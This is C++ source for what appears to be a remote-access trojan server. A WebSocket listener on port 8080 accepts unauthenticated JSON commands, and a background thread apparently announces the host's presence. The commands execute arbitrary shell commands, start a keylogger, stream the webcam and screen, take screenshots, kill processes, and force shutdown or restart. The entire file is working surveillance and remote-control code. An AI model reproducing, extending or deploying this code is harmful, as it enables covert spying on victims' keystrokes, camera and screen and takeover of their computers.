#include "screenshot.h"
#include "keylogger.h"
#include "list_app.h"
#include "camera.h"
#include "restart.h"
#include "shutdown.h"
#include "screen.h"
#include "list_proc.h"
#include "terminal.h"
#include "announce.h"

using tcp = boost::asio::ip::tcp;
namespace websocket = boost::beast::websocket;
namespace beast = boost::beast;
namespace net = boost::asio;
namespace http = beast::http;
using json = nlohmann::json;

auto file_logger = spdlog::basic_logger_mt("file_logger", "logs/server_log.txt", true);

void session(tcp::socket socket) {
    try {
        auto ws_ptr = std::make_shared<websocket::stream<tcp::socket>>(std::move(socket));
        ws_ptr->accept();
        sendMsg(*ws_ptr, "text", "PATH", std::filesystem::current_path().string());
        for (;;) {
            beast::flat_buffer buffer;
            ws_ptr->read(buffer);
            std::string msg = beast::buffers_to_string(buffer.data());
            file_logger->info("Received: {}", msg);
            std::cout << "Received: " << msg << std::endl;
            json data = json::parse(msg);
            if (data.contains("terminal")) {
                std::string command = data["terminal"];
                std::string path = data["path"];
                executeCommand(command, path, *ws_ptr);
                continue;
            }
            if (data["command"] == "screenshot") {
                sendMsg(*ws_ptr, "text", "Info", "Capturing screenshot...");
                captureScreenshot(*ws_ptr);
            }
            else if (data["command"] == "processes") {
                sendMsg(*ws_ptr, "text", "Info", "Listing running processes...");
                list_processes(*ws_ptr);
            }
            else if (data["command"] == "applications") {
                sendMsg(*ws_ptr, "text", "Info", "Listing running applications...");
                list_applications(*ws_ptr);
            }
            else if (data["command"] == "start_keylogger") {
                sendMsg(*ws_ptr, "text", "Info", "Keylogger started.");
                key_log_start(ws_ptr);  
            }
            else if (data["command"] == "stop_keylogger") {
                key_log_stop();
                sendMsg(*ws_ptr, "text", "Info", "Keylogger stopped.");
            }
            else if (data["command"] == "shutdown") {
                sendMsg(*ws_ptr, "text", "Info", "Shutting down the system...");
                system("shutdown /s /t 0 /f");
            }
            else if (data["command"] == "restart") {
                sendMsg(*ws_ptr, "text", "Info", "Restarting the system...");
                system("shutdown /r /t 0 /f");
            }
            else if (data["command"] == "start_camera") {
                sendMsg(*ws_ptr, "text", "Info", "Camera started.");
                startCamera(ws_ptr);
                sendMsg(*ws_ptr, "text", "Info", "Showing video...");
            }
            else if (data["command"] == "stop_camera") {
                stopCamera();
                sendMsg(*ws_ptr, "text", "Info", "Camera stopped.");
            }
            else if (data["command"] == "start_screen") {
                sendMsg(*ws_ptr, "text", "Info", "Screen recording started.");
                startScreen(ws_ptr);
                sendMsg(*ws_ptr, "text", "Info", "Recording screen...");
            }
            else if (data["command"] == "stop_screen") {
                sendMsg(*ws_ptr, "text", "Info", "Screen recording stopped.");
                stopScreen();
            }
            else if (data["command"] == "stop_process") {
                try {
                    if (!data.contains("pid")) {
                        sendMsg(*ws_ptr, "text", "Error", "PID not provided.");
                    } else {
                        uint32_t pid = 0;
                        bool pid_ok = false;

                        if (data["pid"].is_number_integer()) {
                            pid = data["pid"].get<uint32_t>();
                            pid_ok = true;
                        } else if (data["pid"].is_string()) {
                            try {
                                pid = static_cast<uint32_t>(std::stoul(data["pid"].get<std::string>()));
                                pid_ok = true;
                            } catch (...) {
                                pid_ok = false;
                            }
                        }

                        if (!pid_ok) {
                            sendMsg(*ws_ptr, "text", "Error", "Invalid PID format or type.");
                        } else {
                            std::cout << "PID: " << pid << std::endl;
                            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, static_cast<DWORD>(pid));
                            if (hProcess == NULL)
                                sendMsg(*ws_ptr, "text", "Error", "Failed to open process with PID " + std::to_string(pid));
                            else {
                                if (TerminateProcess(hProcess, 0))
                                    sendMsg(*ws_ptr, "text", "Info", "Process with PID " + std::to_string(pid) + " terminated.");
                                else
                                    sendMsg(*ws_ptr, "text", "Error", "Failed to terminate process with PID " + std::to_string(pid));
                                CloseHandle(hProcess);
                            }
                        }
                    }
                } catch (const std::exception& e) {
                    file_logger->error("Error terminating process: {}", e.what());
                    sendMsg(*ws_ptr, "text", "Error", std::string("Exception: ") + e.what());
                }
            }
            else {
                sendMsg(*ws_ptr, "text", "Info", "Unknown command: " + msg);
            }
        }
    }
    catch (std::exception& e) {
        file_logger->error("Session error: {}", e.what());
        std::cerr << "Session error: " << e.what() << "\n";
        key_log_stop();
        stopCamera();
        stopScreen();
    } catch (...) {
        file_logger->error("Session unknown error");
        std::cerr << "Session unknown error\n";
        key_log_stop();
        stopCamera();
        stopScreen();
    }
}

int main() {
    try {
        net::io_context ioc;
        tcp::acceptor acceptor(ioc, {tcp::v4(), 8080});
        spdlog::flush_on(spdlog::level::info);

        file_logger->info("Server running at ws://localhost:8080");
        
        std::thread(announce_once).detach();
        std::cout << "Server running at ws://localhost:8080\n";

        for (;;) {
            tcp::socket socket(ioc);
            acceptor.accept(socket);
            std::thread([s = std::move(socket)]() mutable {
                session(std::move(s));
            }).detach();
        }

    } catch (std::exception& e) {
        file_logger->error("Error: {}", e.what());
        std::cerr << "Error: " << e.what() << std::endl;
    }
}
